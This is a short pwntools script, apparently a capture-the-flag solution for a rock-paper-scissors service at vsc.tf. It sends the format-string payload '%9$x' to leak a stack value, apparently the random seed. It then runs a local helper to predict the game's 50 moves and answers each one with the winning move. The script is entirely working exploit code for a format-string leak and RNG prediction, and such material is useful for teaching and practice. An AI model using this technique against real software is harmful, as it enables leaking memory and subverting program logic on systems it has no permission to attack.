from pwn import *
from os import popen

#io = process('./rps')
io = remote('vsc.tf', 3094)

io.sendline(b'%9$x')
io.recvuntil(b'Hi ')
rand = int(io.recvline(),16)
b = popen('./a.out '+str(rand)).read()
for i in range(50):
    if b[i] == 'r':
        io.sendline(b'p')
    elif b[i] == 's':
        io.sendline(b'r')
    else:
        io.sendline(b's')

print(io.recvall())
